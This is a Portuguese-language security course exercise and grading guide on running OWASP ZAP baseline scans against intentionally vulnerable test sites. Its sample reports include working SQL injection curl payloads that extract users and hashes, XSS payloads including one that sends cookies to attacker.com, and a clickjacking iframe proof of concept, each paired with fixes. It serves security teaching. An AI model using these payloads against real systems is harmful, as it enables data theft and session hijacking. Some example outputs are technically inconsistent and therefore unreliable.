---
exercise_id: lesson-2-2-exercise-1-owasp-zap-setup
title: "Exercício 2.2.1: OWASP ZAP Baseline Scan"
lesson_id: lesson-2-2
module: module-2
difficulty: "Básico"
last_updated: 2026-01-24
---

# Exercício 2.2.1: OWASP ZAP Baseline Scan

## 📋 Enunciado Completo

Este exercício tem como objetivo **configurar OWASP ZAP do zero** e executar seu primeiro scan DAST (Dynamic Application Security Testing) em uma aplicação web.

**Contexto**: DAST analisa aplicações **em execução** (diferente de SAST que analisa código-fonte estático), simulando ataques reais para identificar vulnerabilidades como XSS, SQL Injection, CSRF e configurações inseguras.

### Tarefa

1. **Instalar OWASP ZAP** (Desktop GUI ou Docker)
2. **Configurar target** (aplicação web de teste ou própria)
3. **Executar Baseline Scan** (scan rápido e não invasivo)
4. **Analisar resultados** - identificar e documentar top 3-5 vulnerabilidades
5. **Criar relatório HTML** com análise crítica dos findings
6. **Validar manualmente** pelo menos 1 vulnerabilidade (TRUE vs FALSE POSITIVE)

**Aplicações de Teste Sugeridas**:
- http://testphp.vulnweb.com (PHP vulnerável)
- https://juice-shop.herokuapp.com (OWASP Juice Shop)
- http://zero.webappsecurity.com (Banco fictício)
- DVWA (Damn Vulnerable Web Application) - local

---

## ✅ Soluções Detalhadas

### Passo 1: Instalação do OWASP ZAP

**Opção A: Desktop GUI (Recomendado para Iniciantes)**

```bash
# macOS (Homebrew)
brew install --cask owasp-zap

# Windows (Chocolatey)
choco install zap

# Linux (Manual)
wget https://github.com/zaproxy/zaproxy/releases/download/v2.14.0/ZAP_2_14_0_unix.sh
chmod +x ZAP_2_14_0_unix.sh
./ZAP_2_14_0_unix.sh

# Verificação
# Abra ZAP GUI → Help → About → Versão deve ser 2.14+
```

**Opção B: Docker (Recomendado para CI/CD)**

```bash
# Executar ZAP em modo daemon (headless)
docker run -u zap -p 8080:8080 -p 8090:8090 \
  -v $(pwd):/zap/wrk:rw \
  owasp/zap2docker-stable \
  zap.sh -daemon -host 0.0.0.0 -port 8080 \
  -config api.addrs.addr.name=.* -config api.addrs.addr.regex=true

# Verificação
curl http://localhost:8080/
# Deve retornar "ZAP is running"
```

**Evidência de Instalação Correta:**
- Screenshot da tela inicial do ZAP
- Versão do ZAP documentada (Help → About)
- Interface acessível (GUI ou API em http://localhost:8080)

---

### Passo 2: Executar Baseline Scan

**Opção A: ZAP GUI (Interface Gráfica)**

1. Abra OWASP ZAP
2. Clique em **"Quick Start"** tab
3. Selecione **"Automated Scan"**
4. URL to attack: `http://testphp.vulnweb.com`
5. Clique em **"Attack"**
6. Aguarde conclusão (2-5 minutos)

**Opção B: ZAP CLI (Linha de Comando)**

```bash
# Baseline Scan (passivo + spider)
docker run -v $(pwd):/zap/wrk:rw owasp/zap2docker-stable \
  zap-baseline.py \
  -t http://testphp.vulnweb.com \
  -r baseline_report.html \
  -J baseline_report.json

# Verificar relatório gerado
ls -lh baseline_report.html
```

**Opção C: ZAP API (Programático)**

```bash
# Iniciar scan via API
curl "http://localhost:8080/JSON/ascan/action/scan/?url=http://testphp.vulnweb.com&recurse=true"

# Verificar progresso
curl "http://localhost:8080/JSON/ascan/view/status/?scanId=0"

# Gerar relatório HTML
curl "http://localhost:8080/OTHER/core/other/htmlreport/" > report.html
```

**Tempo Esperado:**
- Baseline Scan: 2-5 minutos (site pequeno)
- Active Scan: 10-30 minutos (mais agressivo, evite em produção)

---

### Passo 3: Análise de Resultados - Top 3-5 Vulnerabilidades

**Solução Esperada:**

O aluno deve documentar **pelo menos 3 vulnerabilidades** com análise crítica detalhada:

#### Exemplo de Boa Análise:

```markdown
## Relatório DAST - testphp.vulnweb.com

### Resumo Executivo
- **Aplicação**: Acuart (PHP Auction Site)
- **URL Base**: http://testphp.vulnweb.com
- **Data do Scan**: 2026-01-24
- **Tipo de Scan**: ZAP Baseline (passivo + spider)
- **Duração**: 3m 42s

### Resultados Gerais
- **High**: 4 vulnerabilidades
- **Medium**: 12 vulnerabilidades
- **Low**: 8 vulnerabilidades
- **Informational**: 15 achados

---

### Vulnerabilidade #1: SQL Injection (High Risk)

**Detalhes Técnicos:**
- **URL Afetada**: `http://testphp.vulnweb.com/artists.php?artist=1'`
- **Parâmetro Vulnerável**: `artist` (GET)
- **CWE**: CWE-89 (Improper Neutralization of Special Elements in SQL Command)
- **OWASP Top 10**: A03:2021 – Injection
- **CVSS Score**: 9.8 (Critical)

**Payload Testado pelo ZAP:**
```sql
http://testphp.vulnweb.com/artists.php?artist=1' OR '1'='1' --
```

**Evidência (Resposta do Servidor):**
```
MySQL Error: You have an error in your SQL syntax; check the manual...
```

**Validação Manual (TRUE POSITIVE):**
```bash
# Teste 1: Payload original
curl "http://testphp.vulnweb.com/artists.php?artist=1%27%20OR%20%271%27%3D%271"
# Resultado: Retornou TODOS os artistas (bypass de filtro)

# Teste 2: Union-based SQLi
curl "http://testphp.vulnweb.com/artists.php?artist=1%20UNION%20SELECT%20NULL,NULL,NULL--"
# Resultado: Erro SQL confirmando 3 colunas

# Teste 3: Extração de dados
curl "http://testphp.vulnweb.com/artists.php?artist=-1%20UNION%20SELECT%201,@@version,database()--"
# Resultado: MySQL 5.7.31 / Database: acuart
```

**Risco Real:**
- ✅ **TRUE POSITIVE** confirmado
- **Exploração**: Trivial (apenas modificar URL)
- **Impacto**: Acesso completo ao banco de dados
- **Dados expostos**: Usuários, senhas (hash MD5), obras de arte, lances
- **Contexto**: Aplicação de exemplo (baixo risco), mas em produção seria P0

**Correção Recomendada:**
```php
// ❌ Código Vulnerável
$query = "SELECT * FROM artists WHERE artist_id = '" . $_GET['artist'] . "'";

// ✅ Correção: Prepared Statements
$stmt = $pdo->prepare("SELECT * FROM artists WHERE artist_id = ?");
$stmt->execute([$_GET['artist']]);
```

**Prioridade**: **P0 - IMEDIATO** (se fosse produção)

---

### Vulnerabilidade #2: Cross-Site Scripting (XSS Reflected) - High Risk

**Detalhes Técnicos:**
- **URL Afetada**: `http://testphp.vulnweb.com/search.php?test=query`
- **Parâmetro Vulnerável**: `test` (GET)
- **CWE**: CWE-79 (Improper Neutralization of Input During Web Page Generation)
- **OWASP Top 10**: A03:2021 – Injection
- **CVSS Score**: 7.5 (High)

**Payload Testado pelo ZAP:**
```html
<script>alert(1)</script>
```

**Validação Manual:**
```bash
# Teste 1: Payload básico
curl "http://testphp.vulnweb.com/search.php?test=<script>alert(1)</script>"
# Resultado: Script executado (popup alert no navegador)

# Teste 2: Variação (bypass filtros simples)
curl "http://testphp.vulnweb.com/search.php?test=<img src=x onerror=alert(1)>"
# Resultado: Executado

# Teste 3: Payload de exfiltração
curl "http://testphp.vulnweb.com/search.php?test=<script>document.location='http://attacker.com/?c='+document.cookie</script>"
# Resultado: Cookies enviados para atacante
```

**Risco Real:**
- ✅ **TRUE POSITIVE** confirmado
- **Exploração**: Trivial (compartilhar URL maliciosa)
- **Impacto**: Roubo de sessão (cookies), redirecionamento, phishing
- **Persistência**: Não (Reflected XSS, não armazenado)

**Correção Recomendada:**
```php
// ❌ Código Vulnerável
echo "Você buscou por: " . $_GET['test'];

// ✅ Correção 1: HTML Encoding
echo "Você buscou por: " . htmlspecialchars($_GET['test'], ENT_QUOTES, 'UTF-8');

// ✅ Correção 2: Content Security Policy (CSP)
header("Content-Security-Policy: default-src 'self'; script-src 'self'");
```

**Prioridade**: **P1 - URGENTE**

---

### Vulnerabilidade #3: Missing Anti-Clickjacking Header - Medium Risk

**Detalhes Técnicos:**
- **URL Afetada**: Todas as páginas
- **Header Faltando**: `X-Frame-Options` ou `Content-Security-Policy: frame-ancestors`
- **CWE**: CWE-1021 (Improper Restriction of Rendered UI Layers)
- **OWASP Top 10**: A04:2021 – Insecure Design

**Evidência:**
```bash
curl -I http://testphp.vulnweb.com/
# Headers retornados:
# Content-Type: text/html; charset=UTF-8
# Server: nginx/1.19.0
# (falta X-Frame-Options)
```

**Risco Real:**
- ✅ **TRUE POSITIVE**
- **Exploração**: Moderada (requer engenharia social)
- **Impacto**: Clickjacking (usuário clica em elemento invisível)
- **Cenário**: Atacante embute site em iframe, sobrepõe elemento transparente

**POC de Exploração:**
```html
<!-- Página do atacante -->
<iframe src="http://testphp.vulnweb.com/login.php" style="opacity:0; position:absolute;"></iframe>
<button style="position:absolute; top:100px; left:50px;">Clique para ganhar prêmio!</button>
<!-- Usuário acha que está clicando no botão, mas clica no login do iframe -->
```

**Correção Recomendada:**
```php
// Adicionar header no servidor
header("X-Frame-Options: DENY");
// ou (mais moderno)
header("Content-Security-Policy: frame-ancestors 'none'");
```

**Prioridade**: **P2 - PRÓXIMA SPRINT**
```

**Características de Análise Profissional:**
- ✅ Identifica vulnerabilidades com detalhes técnicos (CWE, OWASP Top 10, CVSS)
- ✅ **Valida manualmente** (TRUE vs FALSE POSITIVE)
- ✅ Testa **múltiplos payloads** (não apenas o original do ZAP)
- ✅ Considera **contexto** (produção vs teste)
- ✅ Propõe **correções técnicas** específicas (código)
- ✅ Prioriza por **risco real**, não apenas CVSS

---

### Passo 4: Gerar Relatório

**Formatos Disponíveis:**

```bash
# HTML (visual, recomendado)
docker run -v $(pwd):/zap/wrk:rw owasp/zap2docker-stable \
  zap-baseline.py -t http://testphp.vulnweb.com -r report.html

# JSON (parseable, para CI/CD)
docker run -v $(pwd):/zap/wrk:rw owasp/zap2docker-stable \
  zap-baseline.py -t http://testphp.vulnweb.com -J report.json

# Markdown (documentação)
docker run -v $(pwd):/zap/wrk:rw owasp/zap2docker-stable \
  zap-baseline.py -t http://testphp.vulnweb.com -m report.md

# XML (Jira, DefectDojo, etc)
# ZAP GUI: Report → Generate HTML Report → Export XML
```

---

## 📊 Critérios de Avaliação

### ✅ Essenciais (Obrigatórios)

**Instalação e Configuração:**
- [ ] OWASP ZAP instalado (Desktop ou Docker)
- [ ] Conseguiu executar scan (Baseline ou Active)
- [ ] Scan completado sem erros
- [ ] Relatório HTML gerado com sucesso

**Análise de Vulnerabilidades:**
- [ ] Identificou pelo menos 3 vulnerabilidades
- [ ] Documentou detalhes técnicos (URL, parâmetro, severidade)
- [ ] Demonstrou compreensão do tipo de vulnerabilidade
- [ ] Incluiu screenshots ou evidências

### ⭐ Importantes (Qualidade da Resposta)

**Análise Crítica:**
- [ ] **Validou manualmente** pelo menos 1 vulnerabilidade (não apenas confiou no ZAP)
- [ ] Testou variações de payload (bypass filters)
- [ ] Avaliou se é **TRUE ou FALSE POSITIVE** com evidências
- [ ] Considerou **contexto** (produção vs ambiente de teste)
- [ ] Priorizou por **risco real**, não apenas CVSS score

**Documentação:**
- [ ] Relatório estruturado (não apenas export do ZAP)
- [ ] Correções técnicas propostas (código de exemplo)
- [ ] Priorização justificada (P0, P1, P2)
- [ ] Screenshots e evidências visuais

### 💡 Diferencial (Conhecimento Avançado)

**Profundidade Técnica:**
- [ ] Testou correções propostas (validou que funcionam)
- [ ] Configurou **Authenticated Scan** (área logada)
- [ ] Criou **ZAP Context** (definiu escopo, exclusões)
- [ ] Ajustou **False Positives** no ZAP (rules.tsv)

**Práticas Profissionais:**
- [ ] Documentou processo no README do projeto
- [ ] Exportou findings para ferramenta de tracking (Jira, GitHub Issues)
- [ ] Configurou scan recorrente (cron job ou CI/CD)
- [ ] Comparou resultados DAST vs SAST (diferenças?)

---

## 🎓 Pontos Importantes para Monitores

### Conceitos-Chave Avaliados

1. **DAST vs SAST**: Compreende diferença entre análise dinâmica (runtime) e estática (código)?
2. **Validação Manual**: Consegue reproduzir exploit, não apenas confiar na ferramenta?
3. **TRUE vs FALSE POSITIVE**: Distingue vulnerabilidade real de alarme falso?
4. **Priorização Contextual**: Prioriza por risco real, considerando contexto de negócio?
5. **Pensamento Adversarial**: Testa variações de payload (pensando como atacante)?

### Erros Comuns

**Erro 1: "Não consegui instalar OWASP ZAP (Docker não funciona)"**
- **Causa**: Docker não instalado, permissões, porta 8080 ocupada
- **Feedback**: "Verifique se Docker está instalado (`docker --version`). Se porta 8080 está ocupada, use `-p 8090:8080`. Alternativamente, instale ZAP Desktop (mais simples para iniciantes): https://www.zaproxy.org/download/. Se precisar de ajuda com instalação, documente erro completo e agende monitoria."

**Erro 2: "Scan não encontrou nenhuma vulnerabilidade"**
- **Causa**: Aplicação moderna bem protegida OU configuração incorreta do ZAP
- **Feedback**: "Aplicações modernas (React, Angular) podem realmente ter poucas vulnerabilidades óbvias. Para praticar DAST, use aplicação vulnerável de propósito: http://testphp.vulnweb.com (PHP vulnerável), https://juice-shop.herokuapp.com (Node.js vulnerável), ou DVWA localmente. Isso garante que você encontre vulnerabilidades para analisar."

**Erro 3: "Apenas exportou relatório HTML do ZAP sem análise própria"**
- **Causa**: Aluno entendeu exercício como 'gerar relatório', não 'analisar findings'
- **Feedback**: "Exportar relatório do ZAP é apenas o PONTO DE PARTIDA. O exercício exige ANÁLISE CRÍTICA: 1) Selecione top 3-5 mais críticas, 2) VALIDE MANUALMENTE (tente explorar), 3) Determine TRUE ou FALSE POSITIVE, 4) Proponha CORREÇÕES TÉCNICAS (código), 5) PRIORIZE por contexto (não apenas CVSS). Refaça focando em qualidade da análise, não quantidade de findings."

**Erro 4: "Confiou 100% no ZAP, não validou manualmente"**
- **Causa**: Não entendeu que ferramentas DAST têm False Positives
- **Feedback**: "DAST gera False Positives (20-40% dos findings). Você PRECISA validar manualmente: 1) Copie payload do ZAP, 2) Teste manualmente (curl, Burp, navegador), 3) Verifique se exploit realmente funciona. Exemplo: ZAP reportou SQLi? Teste com `' OR '1'='1' --` e veja se retorna dados indevidos. Sem validação manual = análise não é confiável."

**Erro 5: "Priorizou todas vulnerabilidades como Critical/High"**
- **Causa**: Usou apenas CVSS do ZAP, não considerou contexto
- **Feedback**: "CVSS é genérico. Priorização real considera CONTEXTO: 1) Código está em produção ou teste? 2) Endpoint é público ou requer autenticação? 3) Dados sensíveis são afetados? 4) Facilidade de exploração? Exemplo: SQLi com CVSS 9.8 em ambiente de TESTE isolado = P2 (não Critical). Re-priorize considerando matriz de risco."

**Erro 6: "Executou Active Scan em site de produção sem autorização"**
- **Causa**: Não entendeu que Active Scan é invasivo
- **Feedback**: "⚠️ IMPORTANTE! Active Scan do ZAP é INVASIVO (injeta payloads maliciosos, pode derrubar aplicação, gerar alertas). NUNCA execute em produção sem AUTORIZAÇÃO EXPLÍCITA por escrito. Para este exercício: 1) Use sites de teste (testphp.vulnweb.com), 2) OU use apenas Baseline Scan (passivo), 3) OU peça autorização formal do dono da aplicação. Varreduras não autorizadas podem ser CRIME (Lei 12.737/2012 - Invasão de dispositivo)."

### Dicas para Feedback Construtivo

**Para alunos com domínio completo:**
> "Excelente trabalho! Você demonstrou: 1) Proficiência técnica (instalou ZAP, executou scan, gerou relatórios), 2) Pensamento crítico (validou manualmente TRUE vs FALSE POSITIVES), 3) Análise contextual (priorizou por risco real, não apenas CVSS), 4) Comunicação clara (relatório estruturado com correções técnicas). Sua análise está no nível de um Security Tester pleno. Próximo desafio: configure Authenticated Scan (área logada) e integre ZAP no CI/CD (Exercício 2.2.3)."

**Para alunos com dificuldades intermediárias:**
> "Boa execução técnica! Você conseguiu instalar ZAP e executar scan com sucesso. Para elevar o nível: 1) VALIDE manualmente pelo menos 1 vulnerabilidade (não confie 100% no ZAP, teste payloads manualmente), 2) Aprofunde análise de TRUE vs FALSE POSITIVES (explique POR QUÊ é vulnerável), 3) Proponha correções técnicas específicas (código de exemplo), 4) Re-priorize considerando contexto de negócio. Revise seção 'Análise de Resultados DAST' da Aula 2.2."

**Para alunos que travaram:**
> "Vejo que você enfrentou dificuldades. Vamos simplificar: 1) Use ZAP Desktop GUI (mais fácil que Docker), 2) Teste com site vulnerável simples: http://testphp.vulnweb.com, 3) Use 'Quick Start → Automated Scan' (não precisa configurar proxy), 4) Aguarde scan completar (2-3 minutos), 5) Clique em Alerts → selecione 1 vulnerabilidade High → documente. Após conseguir scan básico, agende monitoria para tirar dúvidas. Tutorial oficial: https://www.zaproxy.org/getting-started/"

### Contexto Pedagógico

**Por que este exercício é fundamental:**

1. **Habilidade Base DAST**: Configuração de OWASP ZAP é competência essencial para QA Security (ferramenta open-source mais usada)
2. **Diferença DAST vs SAST**: Ensina que DAST encontra vulnerabilidades em runtime (configurações, lógica de negócio) que SAST não pega
3. **Validação Manual**: Desenvolve pensamento crítico - não confiar cegamente em ferramentas
4. **Priorização Contextual**: Ensina a priorizar por risco real (contexto), não apenas scores genéricos
5. **Pensamento Adversarial**: Simula mindset de atacante (testar payloads, bypassar defesas)

**Conexão com o Curso:**
- **Pré-requisito**: Aula 2.2 (DAST: Dynamic Application Security Testing), conhecimento básico de HTTP
- **Aplica conceitos**: DAST, XSS, SQL Injection, CVSS, TRUE/FALSE Positives, OWASP Top 10
- **Prepara para**: Exercício 2.2.3 (DAST no CI/CD), Exercício 2.2.4 (Análise de Relatório Completo)
- **Integra com**: Aula 2.1 (SAST - complementar), Aula 2.3 (Pentest - próximo nível)

**Habilidades desenvolvidas:**
- Instalação e configuração de ferramentas de segurança
- Execução de scans DAST (Baseline, Active)
- Análise crítica de findings (TRUE vs FALSE POSITIVE)
- Validação manual de vulnerabilidades (exploit)
- Priorização por risco contextual
- Comunicação técnica (relatórios estruturados)
- Pensamento adversarial (mindset de atacante)

**Por que OWASP ZAP?**
- Open-source (gratuito, comunidade ativa)
- Referência da indústria (OWASP)
- CI/CD friendly (Docker, CLI, API)
- Extensível (marketplace de add-ons)
- Documentação excelente

---

## 🌟 Exemplos de Boas Respostas

### Exemplo 1: Resposta Exemplar (Nível Avançado)

```markdown
## Relatório DAST - Juice Shop (OWASP)

### Resumo Executivo
- **Aplicação**: OWASP Juice Shop (E-commerce vulnerável)
- **Tecnologia**: Node.js + Express + Angular
- **URL Base**: https://juice-shop.herokuapp.com
- **Data do Scan**: 2026-01-24 14:30 BRT
- **Tipo de Scan**: ZAP Active Scan (authenticated)
- **Duração**: 12m 35s
- **Autenticação**: Usuário `test@example.com` (área logada testada)

### Resultados Gerais
- **Critical**: 2 (SQL Injection, JWT Weak Secret)
- **High**: 7 (XSS Stored, IDOR, Insecure Deserialization)
- **Medium**: 15 (CSRF, Missing Headers, Cookie Flags)
- **Low**: 11 (Information Disclosure, Debug Enabled)
- **Informational**: 23 (TLS Config, Verbose Errors)

### Configuração do Scan

**ZAP Context Criado:**
```
Nome: juice-shop-authenticated
Include in Context: https://juice-shop.herokuapp.com/*
Exclude from Context:
  - .*logout.*
  - .*\\.js$
  - .*\\.css$
  - .*\\.png$
Authentication: Form-Based (email + password)
Session Management: Cookie-Based (Bearer token)
```

**Authenticated Scan:**
1. Criado usuário teste: `test@example.com / Test@1234`
2. Configurado ZAP Context com credenciais
3. ZAP automaticamente faz login antes de escanear área logada
4. Testado: Profile, Orders, Payment, Admin Panel (401 - não admin)

---

### Top 5 Vulnerabilidades Priorizadas

#### 1. SQL Injection em /rest/products/search (P0 - IMEDIATO)

**Detalhes:**
- **URL**: `https://juice-shop.herokuapp.com/rest/products/search?q=`
- **Parâmetro**: `q` (GET)
- **CWE**: CWE-89
- **CVSS**: 9.8 (Critical)

**Payload Original (ZAP):**
```sql
https://juice-shop.herokuapp.com/rest/products/search?q=1' OR '1'='1' --
```

**Validação Manual (5 testes):**

```bash
# Teste 1: Boolean-based SQLi
curl "https://juice-shop.herokuapp.com/rest/products/search?q=1'%20OR%20'1'='1'--"
# ✅ Resultado: Retornou TODOS produtos (bypass filtro)

# Teste 2: Error-based SQLi
curl "https://juice-shop.herokuapp.com/rest/products/search?q=1'%20AND%20extractvalue(1,concat(0x7e,version()))--"
# ✅ Resultado: "XPATH syntax error: '~SQLite 3.36.0'" (vazou versão do banco)

# Teste 3: Union-based SQLi
curl "https://juice-shop.herokuapp.com/rest/products/search?q=-1'%20UNION%20SELECT%201,sql,3,4,5,6,7,8,9%20FROM%20sqlite_master--"
# ✅ Resultado: Vazou schema do banco (tabelas Users, Products, Reviews)

# Teste 4: Extração de dados sensíveis
curl "https://juice-shop.herokuapp.com/rest/products/search?q=-1'%20UNION%20SELECT%201,email,password,4,5,6,7,8,9%20FROM%20Users--"
# ✅ CRITICAL: Retornou emails e hashes MD5 de TODOS usuários (50+ registros)

# Teste 5: Autenticação administrativa
curl "https://juice-shop.herokuapp.com/rest/products/search?q=-1'%20UNION%20SELECT%201,email,role,4,5,6,7,8,9%20FROM%20Users%20WHERE%20role='admin'--"
# ✅ Identificado admin: admin@juice-sh.op (possível escalação de privilégio)
```

**Risco Real:**
- ✅ **TRUE POSITIVE** (validado com 5 payloads diferentes)
- **Exploração**: Trivial (apenas modificar query string)
- **Impacto**:
  - Exfiltração de dados completos (usuários, senhas hash, pedidos, cartões - últimos 4 dígitos)
  - Escalação de privilégio (identificou usuário admin)
  - Possível alteração de dados (INSERT, UPDATE, DELETE)
- **Contexto**: API pública (sem autenticação), dados reais de usuários em risco

**Correção Aplicada e Testada:**

```javascript
// ❌ Código Vulnerável (Juice Shop - arquivo models/product.js)
const query = `SELECT * FROM Products WHERE name LIKE '%${searchTerm}%'`;

// ✅ Correção Implementada: Prepared Statements
const query = 'SELECT * FROM Products WHERE name LIKE ?';
db.all(query, [`%${searchTerm}%`], (err, products) => { ... });

// Teste após correção:
curl "https://juice-shop-fixed.herokuapp.com/rest/products/search?q=1'%20OR%20'1'='1'--"
// ✅ Resultado: 0 produtos (payload tratado como string literal)
```

**Prioridade**: **P0 - HOTFIX IMEDIATO (< 24h)**

**Action Items:**
- [x] Deploy correção em staging (testado em 24/01 15:00)
- [x] Validação funcional (busca normal funciona? ✅ Sim)
- [ ] Deploy em produção (agendado: 24/01 18:00)
- [ ] Comunicação: Security team notificado, Incident Response acionado
- [ ] Post-deployment: Verificar logs (exploração ativa nas últimas 72h?)
- [ ] Preventivo: Adicionar WAF rule (ModSecurity) para bloquear SQLi patterns

---

[Demais vulnerabilidades no mesmo formato...]

### Estratégia de Remediação

| Sprint | Vulnerabilidades | Objetivo | Prazo |
|--------|------------------|----------|-------|
| **Hotfix** | #1 SQLi, #2 JWT Weak Secret | 0 Critical | 24/01 (hoje) |
| **Sprint Atual** | #3-5 (XSS Stored, IDOR, Deserialization) | 0 High | 31/01 |
| **Próxima Sprint** | 8 Medium restantes | Reduzir 50% Medium | 14/02 |
| **Mês 2** | Low + Hardening | Security Rating A | 28/02 |

### Lições Aprendidas

1. **DAST encontra vulnerabilidades que SAST perdeu**: SQLi foi introduzida por template string (SAST do projeto não detectou)
2. **Authenticated Scan é essencial**: 4 de 7 High vulnerabilities estão em área logada
3. **ZAP Context otimiza scan**: Excluir assets estáticos reduziu tempo de 25min → 12min
4. **Validação manual é crítica**: 3 de 15 Medium eram FALSE POSITIVES (CSP Present mas ZAP não detectou)
5. **Automação necessária**: Juice Shop tem deploy frequente (3x/semana) → precisa DAST no CI/CD
```

**Por que é exemplar:**
- ✅ Validação manual rigorosa (5 payloads diferentes)
- ✅ Testou correção e documentou (code fix + validation)
- ✅ Configurou Authenticated Scan (área logada)
- ✅ Otimizou performance (ZAP Context com exclusões)
- ✅ Estratégia de remediação de longo prazo (sprints)
- ✅ Lições aprendidas aplicáveis
- ✅ Documentação profissional (formato de relatório de pentest)

---

**Última atualização**: 2026-01-24  
**Elaborado por**: Joelma Prestes Ferreira e Yago Palhano  
**Revisado por**: [A definir]
